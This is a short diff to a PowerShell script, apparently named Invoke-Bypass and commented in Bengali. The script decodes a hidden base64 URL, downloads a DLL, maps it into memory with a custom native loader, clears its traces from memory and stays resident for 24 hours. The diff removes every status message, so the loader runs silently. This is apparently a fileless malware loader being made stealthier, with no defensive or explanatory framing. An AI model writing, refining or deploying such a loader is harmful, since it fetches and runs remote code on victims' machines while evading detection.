@@ -148,7 +148,7 @@ Invoke-Bypass
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
-    Write-Host "[!] C# compilation failed: $_" -ForegroundColor Red
+    
     return
 }
 
@@ -160,16 +160,16 @@ $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
-    Write-Host "[!] Download failed: $_" -ForegroundColor Red
+
     return
 }
 
 # ৪.৫ – ম্যানুয়াল ম্যাপ করো
 try {
     $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
+  
 } catch {
-    Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
+  
     return
 }
 
@@ -178,7 +178,7 @@ $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] DLL successfully loaded. Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan
+
 
 # ================================================================
 #  ★★★ ৫. ২৪ ঘন্টা চালু রাখার জন্য সোজা স্লিপ ★★★
